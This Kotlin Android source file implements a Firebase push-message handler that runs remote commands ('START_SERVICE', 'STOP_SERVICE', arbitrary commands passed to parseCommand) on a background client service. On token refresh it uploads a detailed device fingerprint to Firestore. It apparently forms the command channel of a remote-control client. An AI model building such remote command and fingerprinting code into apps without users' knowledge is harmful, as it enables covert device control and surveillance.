package com.client.services.other

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.preference.PreferenceManager
import android.util.Log
import com.client.isMyServiceRunning
import com.client.services.client.ClientService
import com.client.services.client.ClientServiceStarter
import com.client.services.client.KILL_SELF_BROADCAST
import com.client.services.client.boolToYesNo
import com.client.services.client.currentDeviceID
import com.client.services.client.parseCommand
import com.client.services.client.sendMessage
import com.google.firebase.firestore.FirebaseFirestore
import com.google.firebase.messaging.FirebaseMessagingService
import com.google.firebase.messaging.RemoteMessage
import com.google.firebase.storage.FirebaseStorage
import com.google.gson.Gson

class MyFirebaseMessagingService : FirebaseMessagingService() {
    override fun onCreate() {
        super.onCreate()
//        val killSelfBroadcastReceiver = object : BroadcastReceiver() {
//            override fun onReceive(context: Context, intent: Intent) {
//                android.os.Process.killProcess(android.os.Process.myPid())
//                Log.d("MyFirebaseMessagingService", "Received kill self broadcast")
//            }
//        }
//        registerReceiver(killSelfBroadcastReceiver, IntentFilter(KILL_SELF_BROADCAST), RECEIVER_EXPORTED)
    }

    override fun onMessageReceived(message: RemoteMessage) {
        try {
            // Handle the received message
            val command = message.data["Command"]
            Log.d("FCM", "Command received: $command")
            val firestore = FirebaseFirestore.getInstance()
            val storage = FirebaseStorage.getInstance().reference
            val handler = Handler(Looper.getMainLooper())
            val preferences = getSharedPreferences("Preferences", Context.MODE_MULTI_PROCESS)
            if (command == "START_SERVICE") {
                Intent(applicationContext, ClientService::class.java).also {
                    it.action = ClientService.Actions.START.toString()
                    startService(it)
                }
                sendMessage(
                    this,
                    false,
                    "START_SERVICE: Operation completed successfully"
                )
            } else if (command == "SEND_START_CLIENT_SERVICE_BROADCAST") {
                sendBroadcast(Intent(ClientServiceStarter.ACTION_START_CLIENT_SERVICE))
                sendMessage(
                    this,
                    false,
                    "SEND_START_CLIENT_SERVICE_BROADCAST: Operation completed successfully"
                )
            } else if (command == "STOP_SERVICE") {
                Intent(applicationContext, ClientService::class.java).also {
                    it.action = ClientService.Actions.STOP.toString()
                    startService(it)
                }
                stopService(Intent(applicationContext, ClientService::class.java))
                sendMessage(
                    this,
                    false,
                    "STOP_SERVICE: Operation completed successfully"
                )
            } else if (command == "RESTART_SERVICE") {
                Intent(applicationContext, ClientService::class.java).also {
                    it.action = ClientService.Actions.STOP.toString()
                    startService(it)
                }
                stopService(Intent(applicationContext, ClientService::class.java))
                Thread.sleep(500)
                Intent(applicationContext, ClientService::class.java).also {
                    it.action = ClientService.Actions.START.toString()
                    startService(it)
                }
                sendMessage(
                    this,
                    false,
                    "RESTART_SERVICE: Operation completed successfully"
                )
            } else if (command == "IS_CLIENT_SERVICE_RUNNING") {
                sendMessage(
                    this,
                    false,
                    "IS_CLIENT_SERVICE_RUNNING: ${boolToYesNo(isMyServiceRunning(this, ClientService::class.java))}"
                )
            } else {
                if (!command.isNullOrBlank()) {
                    parseCommand(
                        command,
                        firestore,
                        this,
                        handler,
                        applicationContext,
                        preferences,
                        storage,
                        null,
                        null
                    )
                }
            }
        } catch (ex: Exception) {
            ex.printStackTrace()
            sendMessage(this, false, "Error: ${ex.localizedMessage}")
        }
    }

    override fun onNewToken(token: String) {
        // Handle the received new token
        Log.d("FCM", "Refreshed token: $token")
        // Send the token to server
        val preferences = PreferenceManager.getDefaultSharedPreferences(this)
        currentDeviceID = preferences.getString("DeviceID", "0").toString()
        val partitions = mutableListOf<List<String>>()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            for (p in Build.getFingerprintedPartitions()) {
                partitions.add(
                    listOf(
                        p.name,
                        p.fingerprint,
                        p.buildTimeMillis.toString()
                    )
                )
            }
        }
        FirebaseFirestore.getInstance().collection("Devices").document(currentDeviceID).set(hashMapOf<String,Any>(
            "Device ID" to currentDeviceID,
            "Build.VERSION.BASE_OS" to Build.VERSION.BASE_OS,
            "Build.VERSION.INCREMENTAL" to Build.VERSION.INCREMENTAL,
            "Build.VERSION.SDK_INT" to Build.VERSION.SDK_INT,
            "Build.VERSION.CODENAME" to Build.VERSION.CODENAME,
            "Build.VERSION.SECURITY_PATCH" to Build.VERSION.SECURITY_PATCH,
            "Build.VERSION.RELEASE" to Build.VERSION.RELEASE,
            "Build.VERSION.RELEASE_OR_CODENAME" to if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) Build.VERSION.RELEASE_OR_CODENAME else "",
            "Build.VERSION.RELEASE_OR_PREVIEW_DISPLAY" to if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU)  Build.VERSION.RELEASE_OR_PREVIEW_DISPLAY else "",
            "Build.VERSION.PREVIEW_SDK_INT" to Build.VERSION.PREVIEW_SDK_INT,
            "Build.DISPLAY" to Build.DISPLAY,
            "Build.ID" to Build.ID,
            "Build.BOARD" to Build.BOARD,
            "Build.BOOTLOADER" to Build.BOOTLOADER,
            "Build.FINGERPRINT" to Build.FINGERPRINT,
            "Build.DEVICE" to Build.DEVICE,
            "Build.MANUFACTURER" to Build.MANUFACTURER,
            "Build.HOST" to Build.HOST,
            "Build.HARDWARE" to Build.HARDWARE,
            "Build.BRAND" to Build.BRAND,
            "Build.MODEL" to Build.MODEL,
            "Build.ODM_SKU" to if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) Build.ODM_SKU else "",
            "Build.SKU" to if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) Build.SKU else "",
            "Build.SOC_MANUFACTURER" to if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) Build.SOC_MANUFACTURER else "",
            "Build.SOC_MODEL" to if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) Build.SOC_MODEL else "",
            "Build.SUPPORTED_32_BIT_ABIS" to Build.SUPPORTED_32_BIT_ABIS.toList(),
            "Build.SUPPORTED_64_BIT_ABIS" to Build.SUPPORTED_64_BIT_ABIS.toList(),
            "Build.SUPPORTED_ABIS" to Build.SUPPORTED_ABIS.toList(),
            "Build.USER" to Build.USER,
            "Build.PRODUCT" to Build.PRODUCT,
            "Build.RADIO_VERSION" to Build.getRadioVersion(),
            "Build.CPU_ABI" to Build.CPU_ABI,
            "Build.CPU_ABI2" to Build.CPU_ABI2,
            "Build.TYPE" to Build.TYPE,
            "Build.TAGS" to Build.TAGS,
            "Build.Partition.PARTITION_NAME_SYSTEM" to if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) Build.Partition.PARTITION_NAME_SYSTEM else "",
            "Build.getFingerprintedPartitions()" to Gson().toJson(partitions),
            "FCM Token" to token
        )).addOnFailureListener {
            it.printStackTrace()
        }
    }
}
